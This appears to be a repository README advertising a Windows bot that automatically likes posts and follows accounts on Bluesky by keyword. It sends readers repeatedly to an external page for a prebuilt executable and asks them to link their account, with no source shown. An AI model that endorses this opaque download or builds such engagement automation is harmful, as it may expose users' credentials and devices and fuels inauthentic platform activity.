# bluesky-social-bot v2.6 - Social Media Automation 2026

> **A compact Windows app that automates Bluesky Social engagement by liking posts and following accounts matched by chosen keywords, so you can grow visibility without doing the routine work by hand.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.6-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinlabs63/bluesky-social-bot-executor-v26?style=flat-square)](https://github.com/kevinlabs63/bluesky-social-bot-executor-v26)

---

<p align="center">
  <a href="https://kevinlabs63.github.io/bluesky-social-bot-executor-v26/">
    <img src="https://img.shields.io/badge/Download-bluesky-social-bot%20Latest-brightgreen?style=for-the-badge" alt="Download bluesky-social-bot">
  </a>
</p>

> **[Download bluesky-social-bot v2.6](https://kevinlabs63.github.io/bluesky-social-bot-executor-v26/)**

---

[Download Latest Build](https://kevinlabs63.github.io/bluesky-social-bot-executor-v26/)

---

## Overview

bluesky-social-bot is a desktop automation tool for Bluesky Social users who want to streamline everyday engagement. Rather than spending time hunting for relevant people and posts, the app takes care of likes and follows in the background, leaving you free to spend more energy on content and community building. It is a practical fit for creators, community leads, and anyone trying to expand their audience more efficiently.

Running on Windows, the program uses keyword matching to surface posts and profiles that fit your target topics. By handling repeat actions for you, it helps maintain an active presence on the platform while reducing manual work. Version v2.6 focuses on sharper keyword matching and more flexible scheduling controls for better targeting.

---

## Key Capabilities

- **Auto-Like Actions** - Set the bot to like posts that match the keywords you provide
- **Auto-Follow Actions** - Enable following for users posting about the topics you care about
- **Keyword Targeting** - Work with terms, phrases, or hashtags to narrow engagement
- **Tray-Based Background Use** - Keeps running quietly from the system tray without getting in the way
- **Scheduling Controls** - Choose when automation is allowed to run
- **Session Limits and Timing** - Tune like/follow caps, cooldowns, and how often actions occur in each session
- **Action History** - Review automated activity with timestamped logs

---

## Getting Started

1. Download the latest release from the [download page](https://kevinlabs63.github.io/bluesky-social-bot-executor-v26/)
2. Extract the archive to a folder of your choice (e.g., `bluesky-social-bot-v2.6`)
3. Run `bluesky-social-bot.exe` as a standard user
4. Complete the initial setup wizard to link your Bluesky account

No additional dependencies or runtime installations are required.

---

## How to Use It

Once the app is open, use the following flow to begin automation:

1. **Enter Keywords** - Add the terms tied to your audience in the keyword field
2. **Pick Actions** - Turn on liking, following, or both
3. **Set the Schedule** - Specify the days and hours when the bot should be active
4. **Launch Automation** - Press start to begin background engagement
5. **Check the Logs** - Review the log panel for recent automated activity

Example workflow: Enter "digital art" as a keyword, enable both like and follow actions, set active hours from 9 AM to 5 PM, and start the bot. It will automatically engage with users posting about digital art during those hours.

---

## Configuration

All settings are stored locally in a `config.json` file located in the application directory. You can modify the following parameters:

- `keywords` – Array of target terms (e.g., ["technology", "startup"])
- `like_enabled` – Boolean to enable liking
- `follow_enabled` – Boolean to enable following
- `schedule_start` – Hour when automation begins (24-hour format)
- `schedule_end` – Hour when automation stops
- `action_limit` – Maximum actions per session

Use the built-in settings panel to make changes, or edit the JSON file directly with a text editor.

---

## Requirements

- **Operating System:** Windows 10 or later
- **Runtime:** No additional runtime required (self-contained executable)
- **Storage:** Approximately 50 MB free disk space
- **Account:** Active Bluesky Social account with API access

---

## FAQ

**Where can I ask for help?**  
Open an issue on the [repository](https://github.com/kevinlabs63/bluesky-social-bot-executor-v26) for bug reports or feature requests.

**What happens if Bluesky changes?**  
Compatibility with platform updates is a priority, and releases will be provided when needed.

**Is it possible to use more than one keyword group?**  
Yes, the configuration accepts an array of keywords for wider targeting.

**How do I shut the bot down?**  
Use the stop button in the application window, or exit the program from the system tray icon.

**Do I need API credentials?**  
Yes, you will need to authenticate with your Bluesky account during initial setup.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
